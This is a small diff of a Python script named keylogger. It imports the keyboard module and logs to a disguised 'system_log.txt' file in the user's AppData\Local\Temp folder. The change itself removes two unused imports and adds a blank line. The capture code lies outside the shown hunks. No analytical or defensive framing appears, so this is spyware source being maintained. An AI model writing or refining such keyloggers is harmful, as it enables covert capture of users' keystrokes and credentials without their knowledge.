@@ -1,8 +1,6 @@
 import time
 import keyboard
 import os
-import datetime
-import sys
 
 def keylogger():
     log_file = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp", "system_log.txt")
@@ -55,4 +53,5 @@ def keylogger():
         pass
 
 if __name__ == "__main__":
+
     keylogger()    
